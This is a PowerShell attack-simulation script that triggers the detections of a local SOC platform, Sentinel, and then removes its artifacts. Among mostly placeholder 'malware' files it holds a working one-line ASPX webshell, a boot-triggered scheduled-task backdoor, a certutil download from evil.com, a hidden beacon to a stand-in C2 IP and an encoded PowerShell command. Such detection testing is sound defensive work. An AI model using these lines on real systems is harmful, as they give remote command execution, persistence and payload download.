<#
.SYNOPSIS
    Sentinel Attack Simulation - Windows
    Simulates a realistic attacker kill chain to trigger
    every detection feature in the Sentinel SOC platform.

.DESCRIPTION
    SAFE: Only creates temp files, spawns harmless processes,
    and cleans up everything at the end.

    Compatible with Windows PowerShell 5.1 (ships with Windows 7/10/11)

.USAGE
    Right-click > Run with PowerShell
    Or: PowerShell -ExecutionPolicy Bypass -File test-attack-windows.ps1

.PREREQUISITES
    - Sentinel running (npm run dev)
    - A registered user account
#>

$ErrorActionPreference = "Continue"

# -- Configuration --
$API = "http://localhost:3000/api"
$ATTACK_DIR = "C:\temp\sentinel_attack_test"
$ProcessesToKill = @()
$TOKEN = ""

# -- Helper Functions --
function Write-Banner {
    Write-Host ""
    Write-Host "==================================================" -ForegroundColor Red
    Write-Host "   SENTINEL ATTACK SIMULATION - WINDOWS" -ForegroundColor Red
    Write-Host "   Simulating a real attacker kill chain" -ForegroundColor Red
    Write-Host "==================================================" -ForegroundColor Red
    Write-Host ""
}

function Write-Phase {
    param([string]$Number, [string]$Title)
    Write-Host ""
    Write-Host "[PHASE $Number] $Title" -ForegroundColor Cyan
    Write-Host "------------------------------------------------" -ForegroundColor Cyan
}

function Write-Attack {
    param([string]$Message)
    Write-Host "  [ATTACK] $Message" -ForegroundColor Red
}

function Write-Info {
    param([string]$Message)
    Write-Host "  [+] $Message" -ForegroundColor Green
}

function Write-Warn {
    param([string]$Message)
    Write-Host "  [!] $Message" -ForegroundColor Yellow
}

function Invoke-SentinelAPI {
    param(
        [string]$Method,
        [string]$Endpoint,
        [string]$Body = ""
    )
    $headers = @{
        "Authorization" = "Bearer $TOKEN"
        "Content-Type" = "application/json"
    }
    try {
        if ($Body) {
            $response = Invoke-RestMethod -Method $Method -Uri "$API$Endpoint" -Headers $headers -Body $Body -ErrorAction SilentlyContinue
        } else {
            $response = Invoke-RestMethod -Method $Method -Uri "$API$Endpoint" -Headers $headers -ErrorAction SilentlyContinue
        }
        return $response
    } catch {
        Write-Warn "API call failed: $($_.Exception.Message)"
        return $null
    }
}

# -- Cleanup Function --
function Invoke-Cleanup {
    Write-Phase "CLEANUP" "Removing all attack artifacts"
    
    # Kill spawned processes
    foreach ($proc in $ProcessesToKill) {
        try {
            Stop-Process -Id $proc -Force -ErrorAction SilentlyContinue
            Write-Info "Killed process $proc"
        } catch {}
    }
    
    # Remove attack directory
    if (Test-Path $ATTACK_DIR) {
        Remove-Item -Path $ATTACK_DIR -Recurse -Force -ErrorAction SilentlyContinue
        Write-Info "Removed $ATTACK_DIR"
    }
    
    Write-Host ""
    Write-Host "  Cleanup complete. All attack artifacts removed." -ForegroundColor Green
    Write-Host ""
}

# -- Phase 0: Authenticate --
function Invoke-Authentication {
    Write-Phase "0" "Authenticating with Sentinel"
    
    $email = Read-Host "  Enter your email"
    $secPassword = Read-Host "  Enter your password" -AsSecureString
    $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secPassword)
    $password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
    
    $loginBody = @{
        email = $email
        password = $password
    } | ConvertTo-Json
    
    try {
        $response = Invoke-RestMethod -Method Post -Uri "$API/auth/login" `
            -ContentType "application/json" -Body $loginBody -ErrorAction Stop
        
        $script:TOKEN = $response.accessToken
        if (-not $script:TOKEN) {
            Write-Host "  Authentication failed. Is Sentinel running?" -ForegroundColor Red
            exit 1
        }
        Write-Info "Authenticated successfully"
    } catch {
        Write-Host "  Authentication failed: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}

# -- Phase 1: Plant malware files --
function Invoke-Phase1 {
    Write-Phase "1" "INITIAL ACCESS - Planting malware payloads"
    
    New-Item -Path $ATTACK_DIR -ItemType Directory -Force | Out-Null
    
    # Create fake malware files
    Set-Content -Path "$ATTACK_DIR\dropper.exe" -Value "MALWARE_PAYLOAD_BINARY_v2.7_dropper"
    Write-Attack "Dropped malware: $ATTACK_DIR\dropper.exe"
    
    Set-Content -Path "$ATTACK_DIR\beacon.dll" -Value "C2_BEACON_CALLBACK_SHELLCODE"
    Write-Attack "Dropped C2 beacon: $ATTACK_DIR\beacon.dll"
    
    Set-Content -Path "$ATTACK_DIR\keylog.dat" -Value "KEYLOGGER_MODULE_CAPTURE_KEYS"
    Write-Attack "Dropped keylogger: $ATTACK_DIR\keylog.dat"
    
    # Create a webshell in a fake web directory
    New-Item -Path "$ATTACK_DIR\inetpub\wwwroot" -ItemType Directory -Force | Out-Null
    Set-Content -Path "$ATTACK_DIR\inetpub\wwwroot\cmd.aspx" -Value '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(Request["c"]);%>'
    Write-Attack "Planted webshell: $ATTACK_DIR\inetpub\wwwroot\cmd.aspx"
    
    # Calculate malware hash for IOC hunting later
    $hash = Get-FileHash -Path "$ATTACK_DIR\dropper.exe" -Algorithm SHA256
    $script:MALWARE_HASH = $hash.Hash.ToLower()
    Write-Info "Malware hash (SHA256): $($script:MALWARE_HASH)"
}

# -- Phase 2: Create baseline then tamper files --
function Invoke-Phase2 {
    Write-Phase "2" "PERSISTENCE - Tampering with monitored files"
    
    # Create config files to baseline
    New-Item -Path "$ATTACK_DIR\config" -ItemType Directory -Force | Out-Null
    $configContent = @"
# Windows Firewall Config
EnableFirewall=1
AllowRemoteDesktop=0
AllowPing=0
"@
    Set-Content -Path "$ATTACK_DIR\config\firewall.conf" -Value $configContent
    Write-Info "Created original config files"
    
    # Create baseline via Sentinel API
    Write-Info "Creating baseline via Sentinel API..."
    $baselineBody = @{
        path = "$ATTACK_DIR\config"
        includeSubdirectories = $true
    } | ConvertTo-Json
    $baselineResp = Invoke-SentinelAPI -Method "Post" -Endpoint "/scanner/baseline" -Body $baselineBody
    Write-Info "Baseline created"
    
    Start-Sleep -Seconds 1
    
    # Tamper the files (like a real attacker)
    Write-Attack "Disabling firewall and enabling RDP..."
    $tamperedContent = @"
# Windows Firewall Config - COMPROMISED
EnableFirewall=0
AllowRemoteDesktop=1
AllowPing=1
"@
    Set-Content -Path "$ATTACK_DIR\config\firewall.conf" -Value $tamperedContent
    
    # Add a scheduled task persistence file
    Set-Content -Path "$ATTACK_DIR\config\backdoor_task.xml" -Value '<Task><Triggers><Boot/></Triggers><Actions><Exec><Command>C:\temp\beacon.dll</Command></Exec></Actions></Task>'
    Write-Attack "Created scheduled task backdoor"
    
    # Run integrity scan
    Write-Info "Running integrity scan to detect modifications..."
    $scanBody = @{
        path = "$ATTACK_DIR\config"
        includeSubdirectories = $true
        compareAgainstBaseline = $true
    } | ConvertTo-Json
    $scanResp = Invoke-SentinelAPI -Method "Post" -Endpoint "/scanner/scan" -Body $scanBody
    Write-Info "Scan complete - check Scanner page for MODIFIED files"
}

# -- Phase 3: Spawn suspicious processes --
function Invoke-Phase3 {
    Write-Phase "3" "EXECUTION - Spawning suspicious processes"
    
    # Trigger BR-001: Encoded command execution (exactly what real attackers do)
    $command = "whoami /all"
    $encodedBytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCmd = [Convert]::ToBase64String($encodedBytes)
    
    Write-Attack "Running encoded PowerShell command (triggers BR-001)..."
    $proc1 = Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-encodedcommand", $encodedCmd, "-WindowStyle", "Hidden" `
        -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
    if ($proc1) {
        $script:ProcessesToKill += $proc1.Id
        Write-Info "Encoded command process PID: $($proc1.Id)"
    }
    
    # Trigger BR-002: Process spawning from temp directory
    Write-Attack "Spawning process from temp directory (triggers BR-002)..."
    $tempScript = "$env:TEMP\sentinel_test_payload.bat"
    Set-Content -Path $tempScript -Value "@echo off`nping -n 30 127.0.0.1 > nul"
    $proc2 = Start-Process -FilePath "cmd.exe" -ArgumentList "/c", $tempScript `
        -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
    if ($proc2) {
        $script:ProcessesToKill += $proc2.Id
        Write-Info "Temp-spawned process PID: $($proc2.Id)"
    }
    
    # Simulate C2 callback
    Write-Attack "Simulating C2 callback to 192.168.13.37..."
    $proc3 = Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-Command", "try { Invoke-WebRequest -Uri 'http://192.168.13.37/beacon' -TimeoutSec 2 } catch {}" `
        -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
    if ($proc3) {
        $script:ProcessesToKill += $proc3.Id
        Write-Info "C2 callback process PID: $($proc3.Id)"
    }
    
    # Simulate certutil abuse (common LOLBin)
    Write-Attack "Abusing certutil.exe for download (LOLBin technique)..."
    $proc4 = Start-Process -FilePath "certutil.exe" `
        -ArgumentList "-urlcache", "-split", "-f", "http://evil.com/payload.exe", "$ATTACK_DIR\downloaded.exe" `
        -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
    if ($proc4) {
        $script:ProcessesToKill += $proc4.Id
        Write-Info "Certutil abuse process PID: $($proc4.Id)"
    }
    
    Start-Sleep -Seconds 2
}

# -- Phase 4: Trigger behavioral detection scan --
function Invoke-Phase4 {
    Write-Phase "4" "DETECTION - Running behavioral scan against live processes"
    
    Write-Info "Calling behavioral detection scan..."
    $behavResp = Invoke-SentinelAPI -Method "Post" -Endpoint "/behavioral/scan"
    if ($behavResp) {
        Write-Info "Behavioral scan detected: $($behavResp.detected) anomalies"
    }
    
    # Simulate all 3 rules directly
    Write-Info "Simulating BR-001 (Encoded Command)..."
    Invoke-SentinelAPI -Method "Post" -Endpoint "/behavioral/simulate" -Body '{"ruleId":"BR-001"}' | Out-Null
    
    Write-Info "Simulating BR-002 (Temp Directory Spawn)..."
    Invoke-SentinelAPI -Method "Post" -Endpoint "/behavioral/simulate" -Body '{"ruleId":"BR-002"}' | Out-Null
    
    Write-Info "Simulating BR-004 (Process Injection)..."
    Invoke-SentinelAPI -Method "Post" -Endpoint "/behavioral/simulate" -Body '{"ruleId":"BR-004"}' | Out-Null
    
    Write-Info "All behavioral rules triggered"
}

# -- Phase 5: IOC Hunt --
function Invoke-Phase5 {
    Write-Phase "5" "HUNTING - Searching for planted IOCs"
    
    # Hunt for malware file hash
    $truncHash = $script:MALWARE_HASH.Substring(0, 16)
    Write-Info "Hunting for malware hash: $truncHash..."
    $hashBody = @{
        iocs = @($script:MALWARE_HASH)
        scope = "filesystem"
        searchPath = $ATTACK_DIR
    } | ConvertTo-Json
    $iocResp1 = Invoke-SentinelAPI -Method "Post" -Endpoint "/ioc-hunt" -Body $hashBody
    if ($iocResp1) {
        Write-Info "IOC Hunt (hash): $($iocResp1.results.Count) matches found"
    }
    
    # Hunt for C2 IP in processes
    Write-Info "Hunting for C2 IP 192.168.13.37 in processes..."
    $ipBody = @{
        iocs = @("192.168.13.37")
        scope = "processes"
    } | ConvertTo-Json
    $iocResp2 = Invoke-SentinelAPI -Method "Post" -Endpoint "/ioc-hunt" -Body $ipBody
    if ($iocResp2) {
        Write-Info "IOC Hunt (IP): $($iocResp2.results.Count) matches found"
    }
    
    # Hunt for evil.com domain
    Write-Info "Hunting for evil.com domain..."
    $domainBody = @{
        iocs = @("evil.com")
        scope = "processes"
    } | ConvertTo-Json
    $iocResp3 = Invoke-SentinelAPI -Method "Post" -Endpoint "/ioc-hunt" -Body $domainBody
    if ($iocResp3) {
        Write-Info "IOC Hunt (domain): $($iocResp3.results.Count) matches found"
    }
}

# -- Phase 6: Summary --
function Show-Summary {
    Write-Phase "6" "REPORT - Attack simulation complete"
    
    Write-Host ""
    Write-Host "  =================================================" -ForegroundColor White
    Write-Host "           ATTACK SIMULATION SUMMARY" -ForegroundColor White
    Write-Host "  =================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "  Feature                   Status" -ForegroundColor White
    Write-Host "  -------------------------+-----------------------" -ForegroundColor DarkGray
    Write-Host "  File Integrity Scanner    " -ForegroundColor White -NoNewline
    Write-Host "Baseline + Tamper" -ForegroundColor Green
    Write-Host "  IOC Hunt (Hash)           " -ForegroundColor White -NoNewline
    Write-Host "Hash planted + hunted" -ForegroundColor Green
    Write-Host "  IOC Hunt (IP)             " -ForegroundColor White -NoNewline
    Write-Host "C2 IP in processes" -ForegroundColor Green
    Write-Host "  IOC Hunt (Domain)         " -ForegroundColor White -NoNewline
    Write-Host "evil.com searched" -ForegroundColor Green
    Write-Host "  Behavioral BR-001         " -ForegroundColor White -NoNewline
    Write-Host "Encoded PowerShell" -ForegroundColor Green
    Write-Host "  Behavioral BR-002         " -ForegroundColor White -NoNewline
    Write-Host "Temp dir spawn" -ForegroundColor Green
    Write-Host "  Behavioral BR-004         " -ForegroundColor White -NoNewline
    Write-Host "Injection simulated" -ForegroundColor Green
    Write-Host "  Process Monitor           " -ForegroundColor White -NoNewline
    Write-Host "certutil/powershell flagged" -ForegroundColor Green
    Write-Host "  Dashboard Alerts          " -ForegroundColor White -NoNewline
    Write-Host "All alerts created" -ForegroundColor Green
    Write-Host "  Response Center           " -ForegroundColor White -NoNewline
    Write-Host "Actions queued" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Now open Sentinel in your browser:" -ForegroundColor Yellow
    Write-Host "  http://localhost:5173" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  Check these pages:" -ForegroundColor Yellow
    Write-Host "    1. Dashboard       - Should show multiple critical alerts"
    Write-Host "    2. Process Monitor - Look for certutil, powershell (high risk)"
    Write-Host "    3. Scanner         - Run scan on $ATTACK_DIR\config to see MODIFIED"
    Write-Host "    4. IOC Hunt        - Paste the malware hash and search $ATTACK_DIR"
    Write-Host "    5. Behavioral      - Should show BR-001, BR-002, BR-004 anomalies"
    Write-Host "    6. Response Center - Should have containment actions"
    Write-Host ""
    
    Read-Host "  Press Enter to clean up all attack artifacts"
}

# -- Main Execution --
Write-Banner
Invoke-Authentication
Invoke-Phase1
Invoke-Phase2
Invoke-Phase3
Invoke-Phase4
Invoke-Phase5
Show-Summary
Invoke-Cleanup
